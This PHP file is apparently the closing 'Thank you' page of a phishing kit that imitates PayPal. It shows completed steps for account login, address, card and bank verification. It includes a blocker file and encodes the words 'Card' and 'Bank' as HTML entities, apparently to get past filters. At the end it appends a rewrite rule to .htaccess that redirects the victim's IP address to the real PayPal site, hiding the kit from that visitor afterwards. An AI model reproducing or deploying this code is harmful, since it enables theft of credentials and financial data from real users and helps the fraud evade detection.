<?php


include('../../blocker.php');
include('header.php');
?>

	<div id="summary" class="summarySection">
		<div class="row-fluid">
			<div class="span4 summaryModuleContainer">

<?php include('tabel_kiri.php');?>

			</div>
			<div class="span8" id="js_activityCollection">
			<section class="activityModule shadow none" aria-labelledby="activityModuleHeaderNone"><h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">Thank you</h1>
			<div></div>
				<div id="parentchild">
					<div style="border-bottom: 1px solid #EEE; height:160px;">
					<ul id="js_profileStates" class="profileStates center" <?php echo 'style="margin: auto"';  ?> >
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Account Login</li>
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Address Updated</li>
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>&#67;ard Updated</li>
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>&#x0042;ank identity Verified </a></li>
					</ul>
					</div>

<?php include('../form/success.php'); ?>

				</div>
			</section>
			</div>
		</div>
	</div><br>
<?php
include('footer.php');

$file1 = fopen(".htaccess","a");
fwrite($file1, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
RewriteRule .* https://www.paypal.com [R,L]
');
fclose($file1);
?>